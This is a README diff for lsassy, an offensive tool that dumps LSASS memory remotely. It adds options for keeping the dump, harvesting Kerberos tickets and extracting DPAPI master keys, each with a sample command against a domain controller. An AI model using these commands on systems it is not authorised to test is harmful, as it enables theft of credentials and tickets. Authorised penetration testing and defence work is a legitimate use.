@@ -205,12 +205,28 @@ For example:
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --parse-only --dump-path "/Windows/Temp" --dump-name "lsass.dmp"
 ```
 
+#### Keep dump
+
+If you don't want the dump to be automatically deleted after lsassy run, you can use `--keep-dump`.
+
+```
+lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local --keep-dump
+```
+
 ### Kerberos tickets harvesting
 
-You can extract in-memory Kerberos tickets by using `-K [directory]` or `--kerberos-dir [directory]` parameter. It will extract and save Kerberos tickets in `kirbi` format in the provided output directory. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.
+Kerberos tickets will be extracted and saved to `$HOME/.config/lsassy/tickets` in `kirbi` format. You can specify output directory using `-K [directory]` or `--kerberos-dir [directory]` parameter. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.
 
 ```bash
 lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -K '/tmp/kerberos_tickets'
+```
+
+### DPAPI Master Keys harvesting
+
+DPAPI Master Keys will be extracted and saved to `$HOME/.config/lsassy/masterkeys.txt` in `{GUID}:SHA1` format. You can specify masterkey file path using `-M [path]` or `--masterkeys-file [path]` parameter. If the file path doesn't exist, the tool will attempt to create it before creating the file.
+
+```bash
+lsassy -d adsec.local -u pixis -p h4cknd0 dc01.adsec.local -M '/tmp/keys.txt'
 ```
 
 ### Authentication methods
